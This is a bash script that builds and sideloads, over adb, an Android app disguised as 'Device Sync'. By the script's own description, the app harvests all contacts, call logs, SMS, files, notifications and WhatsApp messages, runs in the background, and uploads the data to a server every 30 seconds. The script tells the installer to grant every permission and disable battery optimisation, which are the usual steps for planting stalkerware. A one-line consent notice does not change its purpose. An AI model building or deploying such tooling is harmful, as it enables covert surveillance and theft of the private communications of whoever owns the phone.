#!/bin/bash

echo "🚀 Kotlin Device Sync App - Auto Harvesting Setup"
echo "================================================="

cd "$(dirname "$0")/kotlin"

echo "📋 This app will automatically:"
echo "   ✅ Harvest ALL contacts, call logs, SMS messages"
echo "   ✅ Scan and catalog ALL files on device storage"
echo "   ✅ Monitor notifications in real-time"
echo "   ✅ Attempt WhatsApp message extraction"
echo "   ✅ Upload data continuously every 30 seconds"
echo "   ✅ Run in background even when app is closed"
echo ""

read -p "Continue with installation? (y/n): " confirm
if [[ $confirm != "y" && $confirm != "Y" ]]; then
    echo "Installation cancelled"
    exit 0
fi

echo ""
echo "🧹 Cleaning previous builds..."
./gradlew clean

echo ""
echo "🔨 Building aggressive data harvesting APK..."
./gradlew assembleDebug --info

BUILD_RESULT=$?

if [ $BUILD_RESULT -eq 0 ]; then
    echo ""
    echo "✅ Build successful!"
    echo ""
    echo "📱 Checking for connected devices..."
    
    adb devices -l
    
    DEVICE_COUNT=$(adb devices | grep -c "device$")
    if [ "$DEVICE_COUNT" -eq 0 ]; then
        echo "❌ No devices connected"
        echo ""
        echo "📋 Device Setup:"
        echo "1. Enable Developer Options: Settings > About Phone > Tap Build Number 7 times"
        echo "2. Enable USB Debugging: Settings > Developer Options > USB Debugging"
        echo "3. Connect device via USB and accept debugging prompt"
        echo ""
        read -p "Connect your device and press Enter to continue..."
        adb devices -l
    else
        echo "✅ Found $DEVICE_COUNT connected device(s)"
    fi
    
    echo ""
    echo "📲 Installing auto-harvesting app..."
    adb install -r app/build/outputs/apk/debug/app-debug.apk
    
    if [ $? -eq 0 ]; then
        echo ""
        echo "🎉 App installed successfully!"
        echo ""
        echo "⚠️  IMPORTANT SETUP STEPS:"
        echo "1. Open 'Device Sync' app on your phone"
        echo "2. Grant ALL permissions (this may take several prompts)"
        echo "3. Enable Notification Access when prompted"
        echo "4. Disable battery optimization for the app"
        echo "5. The app will automatically start harvesting data"
        echo ""
        
        echo "🔥 AGGRESSIVE FEATURES ENABLED:"
        echo "   📞 Contacts: Full contact list with emails, organizations"
        echo "   📱 Call Logs: Complete call history with durations"
        echo "   💬 SMS: All text messages (sent and received)"
        echo "   📁 Files: Scans ALL accessible files and folders"
        echo "   🔔 Notifications: Real-time notification monitoring"
        echo "   💚 WhatsApp: Attempts message extraction (requires root)"
        echo "   🔄 Background: Continuous 30-second harvest cycles"
        echo "   📤 Upload: Automatic server synchronization"
        echo ""
        
        echo "📊 Data will be visible at:"
        echo "   Backend API: http://localhost:3000"
        echo "   Admin Dashboard: http://localhost:3001"
        echo ""
        
        echo "🚨 PRIVACY NOTICE:"
        echo "   This app harvests extensive personal data"
        echo "   Ensure you have proper consent and legal authorization"
        echo "   Data includes contacts, messages, files, and usage patterns"
        
    else
        echo "❌ Installation failed"
        echo ""
        echo "🔧 Troubleshooting:"
        echo "1. Check device connection: adb devices"
        echo "2. Enable USB debugging on device"
        echo "3. Accept any security prompts on device"
        echo "4. Try: adb install -r -d app/build/outputs/apk/debug/app-debug.apk"
    fi
    
else
    echo "❌ Build failed!"
    echo ""
    echo "🔍 Common solutions:"
    echo "1. Check Android SDK installation"
    echo "2. Ensure Java 8+ is installed"
    echo "3. Update Android build tools"
    echo "4. Check for dependency conflicts"
    echo ""
    echo "📋 Run for detailed error info:"
    echo "   ./gradlew assembleDebug --debug"
fi

echo ""
echo "📁 APK Location: app/build/outputs/apk/debug/app-debug.apk"
echo ""
echo "🌐 Backend Setup:"
echo "   Make sure backend is running: cd ../Backend && npm run dev"
echo "   Make sure frontend is running: cd ../frontend && npm run dev"
echo ""
echo "⚡ The app will start harvesting immediately after permissions are granted!"
